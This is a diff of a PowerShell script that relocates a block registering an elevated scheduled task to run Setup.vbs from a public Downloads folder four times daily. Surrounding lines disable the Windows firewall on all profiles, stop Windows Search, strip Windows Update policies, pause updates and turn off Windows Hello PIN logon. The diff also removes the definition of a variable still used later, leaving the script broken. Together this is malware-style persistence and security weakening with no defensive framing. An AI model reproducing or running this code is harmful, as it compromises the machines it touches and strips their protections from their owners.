@@ -14,6 +14,18 @@ if (Test-Path $source) {
     Write-Host "File $source DoesNotExist."
 }
 
+
+
+$taskName = "Run Setup.vbs Daily"
+$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
+$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
+$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
+$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
+$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
+$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force
+
 Stop-Service -Name "WSearch" -Force
 Set-Service -Name "WSearch" -StartupType Disabled
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
@@ -59,8 +71,6 @@ foreach ($task in $tasks) {
 }
 Remove-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Update" -Recurse -Force -ErrorAction SilentlyContinue
-$pause = "2099-12-31T00:00:00Z"
-$pause_start = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
 $regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
 New-Item -Path $regPath -Force | Out-Null
 Set-ItemProperty -Path $regPath -Name "PauseUpdatesStartTime" -Value $pause_start
@@ -88,16 +98,6 @@ Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlo
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
 set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
-
-$taskName = "Run Setup.vbs Daily"
-$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
-$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
-$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
-$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
-$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
-$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 exit
